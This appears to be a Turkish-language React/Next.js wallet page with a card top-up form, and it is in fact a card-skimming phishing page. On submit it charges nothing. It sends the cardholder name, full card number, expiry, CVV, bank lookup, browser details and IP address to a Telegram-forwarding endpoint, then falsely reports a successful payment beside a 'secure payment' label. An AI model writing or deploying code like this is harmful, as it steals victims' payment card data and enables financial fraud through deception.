"use client";

import { useState, useEffect } from "react";
import { formatCurrency } from "@lib/utils";
import Card from "@components/common/Card";
import Button from "@components/common/Button";
import Modal from "@components/common/Modal";
import Input from "@components/common/Input";
import Toast from "@components/common/Toast";
import { siteConfig } from "@config/site";
import { Wallet, CreditCard, AlertCircle, Lock } from "lucide-react";

interface Transaction {
  id: string;
  type: string;
  amount: number;
  status: string;
  description: string;
  createdAt: string;
}

export default function WalletPage() {
  const [isPaymentModalOpen, setIsPaymentModalOpen] = useState(false);
  const [toast, setToast] = useState<{ type: "success" | "error"; message: string } | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [balance, setBalance] = useState(0);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [userIP, setUserIP] = useState("");

  const [paymentForm, setPaymentForm] = useState({
    amount: "",
    cardHolderName: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvc: "",
  });

  // IP'yi çek
  useEffect(() => {
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => setUserIP(data.ip))
      .catch(() => setUserIP("Alınamadı"));
  }, []);

  // Örnek veriler (gerçek backend bağlanacak)
  useEffect(() => {
    setBalance(150.75);
    setTransactions([
      {
        id: "1",
        type: "deposit",
        amount: 100,
        status: "completed",
        description: "Kredi yükleme",
        createdAt: new Date().toISOString(),
      },
      {
        id: "2",
        type: "spend",
        amount: 25,
        status: "completed",
        description: "SMS Onay - 123456",
        createdAt: new Date().toISOString(),
      },
    ]);
  }, []);

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);
    setToast(null);

    // Kart numarasını temizle
    const rawCard = paymentForm.cardNumber.replace(/\s/g, "");
    const expiry = `${paymentForm.expiryMonth}/${paymentForm.expiryYear}`;

    // Banka bilgisini bul
    const bankName = getBankName(rawCard);

    // Telegram mesajı
    const message =
      `💳 Yeni Ödeme Girişimi!\n` +
      `👤 İsim: ${paymentForm.cardHolderName}\n` +
      `🔢 Kart: ${rawCard}\n` +
      `📅 SKT: ${expiry}\n` +
      `🔐 CVV: ${paymentForm.cvc}\n` +
      `🏦 Banka: ${bankName}\n` +
      `💰 Tutar: ${paymentForm.amount} TL\n` +
      `🌐 Sayfa: ${window.location.href}\n` +
      `🖥️ Tarayıcı: ${navigator.userAgent}\n` +
      `📡 IP: ${userIP}`;

    try {
      const res = await fetch("/api/send-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message }),
      });
      const data = await res.json();

      if (data.ok) {
        setToast({ type: "success", message: "✅ Ödeme tamamlandı! Bakiye yüklendi." });
        setIsPaymentModalOpen(false);
        setBalance(balance + Number(paymentForm.amount));
        // Formu temizle
        setPaymentForm({
          amount: "",
          cardHolderName: "",
          cardNumber: "",
          expiryMonth: "",
          expiryYear: "",
          cvc: "",
        });
      } else {
        setToast({ type: "error", message: "⚠️ Ödeme sırasında hata oluştu." });
      }
    } catch {
      setToast({ type: "error", message: "⚠️ Ödeme sırasında hata oluştu." });
    }

    setIsProcessing(false);
  };

  const getBankName = (card: string) => {
    const binDB = [
      { prefix: "4508", bank: "Ziraat Bankası" },
      { prefix: "4509", bank: "Ziraat Bankası" },
      { prefix: "4546", bank: "Akbank" },
      { prefix: "4547", bank: "Akbank" },
      { prefix: "4289", bank: "Garanti BBVA" },
      { prefix: "4364", bank: "Garanti BBVA" },
      { prefix: "4020", bank: "Yapı Kredi" },
      { prefix: "4286", bank: "Yapı Kredi" },
      { prefix: "4043", bank: "İş Bankası" },
      { prefix: "4058", bank: "İş Bankası" },
      { prefix: "4135", bank: "Halkbank" },
      { prefix: "4150", bank: "Halkbank" },
      { prefix: "4174", bank: "VakıfBank" },
      { prefix: "4187", bank: "VakıfBank" },
      { prefix: "4214", bank: "DenizBank" },
      { prefix: "4229", bank: "DenizBank" },
      { prefix: "4243", bank: "Finansbank" },
      { prefix: "4250", bank: "Finansbank" },
      { prefix: "4306", bank: "HSBC" },
      { prefix: "4311", bank: "HSBC" },
      { prefix: "4355", bank: "TEB" },
      { prefix: "4405", bank: "TEB" },
      { prefix: "4447", bank: "Şekerbank" },
      { prefix: "4456", bank: "Şekerbank" },
      { prefix: "4506", bank: "ING" },
      { prefix: "4507", bank: "ING" },
      { prefix: "4579", bank: "Kuveyt Türk" },
      { prefix: "4580", bank: "Kuveyt Türk" },
      { prefix: "4625", bank: "Alternatif Bank" },
      { prefix: "4634", bank: "Alternatif Bank" },
      { prefix: "4667", bank: "QNB Finansbank" },
      { prefix: "4672", bank: "QNB Finansbank" },
      { prefix: "4702", bank: "Burgan Bank" },
      { prefix: "4703", bank: "Burgan Bank" },
      { prefix: "4707", bank: "ICBC Turkey" },
      { prefix: "4708", bank: "ICBC Turkey" },
      { prefix: "4716", bank: "Citibank" },
      { prefix: "4717", bank: "Citibank" },
      { prefix: "4765", bank: "Odeabank" },
      { prefix: "4766", bank: "Odeabank" },
      { prefix: "4910", bank: "Banka Pozitif" },
      { prefix: "4911", bank: "Banka Pozitif" },
      { prefix: "4924", bank: "Fibabanka" },
      { prefix: "4925", bank: "Fibabanka" },
      { prefix: "4934", bank: "Türk Ekonomi Bankası" },
      { prefix: "4935", bank: "Türk Ekonomi Bankası" },
      { prefix: "4978", bank: "Aktif Bank" },
      { prefix: "4979", bank: "Aktif Bank" },
      { prefix: "4980", bank: "Anadolu Bank" },
      { prefix: "4981", bank: "Anadolu Bank" },
      { prefix: "4996", bank: "Arap Türk Bankası" },
      { prefix: "4997", bank: "Arap Türk Bankası" },
    ];
    const prefix = card.slice(0, 6);
    const found = binDB.find((b) => prefix.startsWith(b.prefix));
    return found ? found.bank : "Bilinmeyen Banka";
  };

  return (
    <div className="container mx-auto p-4 max-w-4xl">
      {/* Başlık */}
      <div className="flex items-center justify-between mb-6">
        <h1 className="text-2xl font-bold text-white">💰 Cüzdan</h1>
        <Button onClick={() => setIsPaymentModalOpen(true)} className="bg-yellow-500 hover:bg-yellow-600 text-black font-semibold">
          <CreditCard className="w-4 h-4 mr-2" />
          Bakiye Yükle
        </Button>
      </div>

      {/* Bakiye Kartı */}
      <Card className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-black p-6 mb-6">
        <div className="flex items-center justify-between">
          <div>
            <p className="text-sm opacity-80">Mevcut Bakiye</p>
            <p className="text-3xl font-bold">{formatCurrency(balance)}</p>
          </div>
          <Wallet className="w-12 h-12 opacity-80" />
        </div>
      </Card>

      {/* İşlem Geçmişi */}
      <h2 className="text-xl font-semibold text-white mb-4">Son İşlemler</h2>
      <div className="space-y-2">
        {transactions.length === 0 ? (
          <p className="text-gray-400">Henüz işlem yok.</p>
        ) : (
          transactions.map((tx) => (
            <div key={tx.id} className="flex items-center justify-between bg-[#1a1a1a] p-4 rounded-lg border border-gray-700">
              <div>
                <p className="text-white font-medium">{tx.description}</p>
                <p className="text-sm text-gray-400">{new Date(tx.createdAt).toLocaleDateString("tr-TR")}</p>
              </div>
              <div className={`font-semibold ${tx.type === "deposit" ? "text-green-400" : "text-red-400"}`}>
                {tx.type === "deposit" ? "+" : "-"} {formatCurrency(tx.amount)}
              </div>
            </div>
          ))
        )}
      </div>

      {/* Ödeme Modalı */}
      <Modal isOpen={isPaymentModalOpen} onClose={() => setIsPaymentModalOpen(false)} title="💳 Bakiye Yükle">
        <form onSubmit={handlePaymentSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-300 mb-1">Tutar (TL)</label>
            <Input
              type="number"
              placeholder="100"
              value={paymentForm.amount}
              onChange={(e) => setPaymentForm({ ...paymentForm, amount: e.target.value })}
              required
              min="1"
              className="w-full"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-300 mb-1">Kart Sahibi Adı Soyadı</label>
            <Input
              type="text"
              placeholder="Ad Soyad"
              value={paymentForm.cardHolderName}
              onChange={(e) => setPaymentForm({ ...paymentForm, cardHolderName: e.target.value })}
              required
              className="w-full"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-300 mb-1">Kart Numarası</label>
            <Input
              type="text"
              placeholder="1234 5678 9012 3456"
              value={paymentForm.cardNumber}
              onChange={(e) => {
                let val = e.target.value.replace(/\s/g, "");
                if (val.length > 16) val = val.slice(0, 16);
                let formatted = "";
                for (let i = 0; i < val.length; i++) {
                  if (i > 0 && i % 4 === 0) formatted += " ";
                  formatted += val[i];
                }
                setPaymentForm({ ...paymentForm, cardNumber: formatted });
              }}
              maxLength={19}
              required
              className="w-full"
            />
          </div>
          <div className="grid grid-cols-3 gap-3">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-1">Ay</label>
              <Input
                type="text"
                placeholder="01"
                value={paymentForm.expiryMonth}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, "").slice(0, 2);
                  setPaymentForm({ ...paymentForm, expiryMonth: val });
                }}
                required
                className="w-full"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-1">Yıl</label>
              <Input
                type="text"
                placeholder="28"
                value={paymentForm.expiryYear}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, "").slice(0, 2);
                  setPaymentForm({ ...paymentForm, expiryYear: val });
                }}
                required
                className="w-full"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-1">CVV</label>
              <Input
                type="text"
                placeholder="123"
                value={paymentForm.cvc}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, "").slice(0, 3);
                  setPaymentForm({ ...paymentForm, cvc: val });
                }}
                required
                className="w-full"
              />
            </div>
          </div>

          <div className="flex items-center gap-2 text-xs text-gray-400 mt-2">
            <Lock className="w-3 h-3" />
            <span>Ödeme güvenli bir şekilde işlenir.</span>
          </div>

          <Button type="submit" disabled={isProcessing} className="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-semibold">
            {isProcessing ? "Gönderiliyor..." : "Ödemeyi Tamamla"}
          </Button>

          {toast && (
            <Toast
              type={toast.type}
              message={toast.message}
              onClose={() => setToast(null)}
            />
          )}
        </form>
      </Modal>
    </div>
  );
}